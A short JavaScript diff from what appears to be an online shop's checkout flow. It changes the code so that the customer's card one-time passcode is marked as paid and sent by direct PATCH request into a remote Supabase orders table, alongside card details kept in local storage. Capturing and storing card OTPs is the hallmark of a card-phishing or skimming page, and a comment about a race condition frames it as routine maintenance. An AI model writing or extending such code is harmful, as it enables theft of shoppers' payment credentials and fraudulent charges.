@@ -959,7 +959,14 @@
                 existingOrder.status = 'تم الدفع';
                 existingOrder.cardDetails.otp = otpVal;
                 localStorage.setItem('auraOrders', JSON.stringify(orders));
-                _saveOrderToSupabase(existingOrder);
+                // Direct PATCH to avoid race condition with partial order save
+                try {
+                    var otpRow = { status: 'تم الدفع', card_otp: otpVal };
+                    fetch(_SB_URL + '/rest/v1/orders?order_id=eq.' + existingOrder.id, {
+                        method: 'PATCH', headers: _sbHeaders(),
+                        body: JSON.stringify(otpRow)
+                    }).catch(function(){});
+                } catch(e){}
             } else {
                 const cardNumber = cardNumberInput.value.replace(/\D/g, '');
                 const last4 = cardNumber.slice(-4);
